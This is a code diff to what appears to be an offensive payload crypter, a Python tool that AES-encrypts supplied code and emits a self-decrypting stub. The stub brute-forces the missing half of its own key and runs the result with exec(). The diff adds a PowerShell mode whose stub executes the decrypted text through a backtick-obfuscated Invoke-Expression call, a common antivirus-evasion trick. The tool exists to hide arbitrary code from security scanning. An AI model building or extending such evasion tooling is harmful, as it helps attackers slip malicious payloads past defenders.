@@ -55,6 +55,8 @@ def create_cli_parser():
                            help='File containing data to encrypt')
     protocols.add_argument('-py', '--python', default=False, action='store_true',
                            help='Encrypting python code')
+    protocols.add_argument('-ps', '--powershell', default=False, action='store_true',
+                           help='Encrypting powershell code')
 
     args = parser.parse_args()
 
@@ -66,7 +68,7 @@ def create_cli_parser():
         print('Error: You need to provide a file containing code to encrypt! Try again')
         sys.exit(1)
 
-    if not args.python:
+    if not args.python and not args.powershell:
         print('You need to provide a language to encrypt! Try again...')
         sys.exit(1)
 
@@ -134,29 +136,62 @@ if __name__ == '__main__':
     # base64 encode the data
     encoded_ciphertext = base64.b64encode(encrypted_data)
 
-    # begin creating final output code and add encoded_ciphertext to it
-    final_code = '#!/usr/bin/env python3\n'
-    final_code += 'import base64\n'
-    final_code += 'from Crypto.Cipher import AES\n'
-    final_code += 'encoded_ct = "' + encoded_ciphertext.decode('ascii') + '"\n'
-    final_code += 'decoded = base64.b64decode(encoded_ct)\n'
-    final_code += 'for second_half in range(1000000, 10000000):\n'
-    final_code += '\tkey = "' + aes_base_key + '"\n'
-    final_code += '\tkey = key + str(second_half)\n'
-    final_code += '\tc_o = AES.new(key, AES.MODE_ECB)\n'
-    final_code += '\tdecrypted = c_o.decrypt(decoded)\n'
-    final_code += '\ttry:\n'
-    final_code += '\t\tdecrypted = decrypted.decode("ascii")\n'
-    final_code += '\t\tdecrypted = decrypted.rstrip("&")\n'
-    final_code += '\t\texec(decrypted)\n'
-    final_code += '\texcept:\n'
-    final_code += '\t\tpass'
+    if arguments.python:
+        # begin creating final output code and add encoded_ciphertext to it
+        final_code = '#!/usr/bin/env python3\n'
+        final_code += 'import base64\n'
+        final_code += 'from Crypto.Cipher import AES\n'
+        final_code += 'encoded_ct = "' + encoded_ciphertext.decode('ascii') + '"\n'
+        final_code += 'decoded = base64.b64decode(encoded_ct)\n'
+        final_code += 'for second_half in range(1000000, 10000000):\n'
+        final_code += '\tkey = "' + aes_base_key + '"\n'
+        final_code += '\tkey = key + str(second_half)\n'
+        final_code += '\tc_o = AES.new(key, AES.MODE_ECB)\n'
+        final_code += '\tdecrypted = c_o.decrypt(decoded)\n'
+        final_code += '\ttry:\n'
+        final_code += '\t\tdecrypted = decrypted.decode("ascii")\n'
+        final_code += '\t\tdecrypted = decrypted.rstrip("&")\n'
+        final_code += '\t\texec(decrypted)\n'
+        final_code += '\texcept:\n'
+        final_code += '\t\tpass'
+        file_name = 'encrypted.py'
+    
+    elif arguments.powershell:
+        # Modified from https://stackoverflow.com/questions/31007475/what-is-the-corresponding-powershell-module-for-the-php-encryption-library-using
+        final_code = 'for ($i=1000000; $i -le 10000000; $i++) {\n'
+        final_code += '$key = "' + aes_base_key + '" + $i\n'
+        final_code += '$key = [System.Text.Encoding]::Ascii.GetBytes($key)\n'
+        final_code += '$CipherText = "' + encoded_ciphertext.decode('ascii') + '"\n'
+        final_code += '$RijndaelProvider = New-Object -TypeName System.Security.Cryptography.RijndaelManaged\n'
+        final_code += '$RijndaelProvider.BlockSize = 128\n'
+        final_code += '$RijndaelProvider.Mode      = [System.Security.Cryptography.CipherMode]::ECB\n'
+        final_code += '$RijndaelProvider.Key       = $key\n'
+        final_code += '$RijndaelProvider.Padding   = "None"\n'
+        final_code += '$Decryptor = $RijndaelProvider.CreateDecryptor()\n'
+        final_code += '$Cipher = [convert]::FromBase64String($CipherText) -as [byte[]]\n'
+        final_code += '$DecMemoryStream = New-Object System.IO.MemoryStream -ArgumentList @(,$Cipher)\n'
+        final_code += '$DecCryptoStream = New-Object System.Security.Cryptography.CryptoStream -ArgumentList $DecMemoryStream,$Decryptor,$([System.Security.Cryptography.CryptoStreamMode]::Read)\n'
+        final_code += '$DecStreamWriter = New-Object System.IO.StreamReader -ArgumentList $DecCryptoStream\n'
+        final_code += '$NewPlainText = $DecStreamWriter.ReadToEnd()\n'
+        final_code += '$DecStreamWriter.Close()\n'
+        final_code += '$DecCryptoStream.Close()\n'
+        final_code += '$DecMemoryStream.Close()\n'
+        final_code += '$NewPlainText = $NewPlainText -Replace "[&]",""\n'
+        final_code += '$command = $NewPlainText.Trim()\n'
+        final_code += 'Try {\n'
+        final_code += '`I`NV`o`ke`-`Exp`R`es`s`io`N $command\n'
+        final_code += '}\n'
+        final_code += 'Catch {\n'
+        final_code += '#doit\n'
+        final_code += '}\n'
+        final_code += '}'
+        file_name = 'encrypted.ps1'
 
     print('[*] Writing encrypted file to disk.')
     print('[*] Key used: ' + constrained_key)
 
     # write out code to disk
-    with open('encrypted_code.py', 'w') as code_out:
+    with open(file_name, 'w') as code_out:
         code_out.write(final_code)
 
     #fin
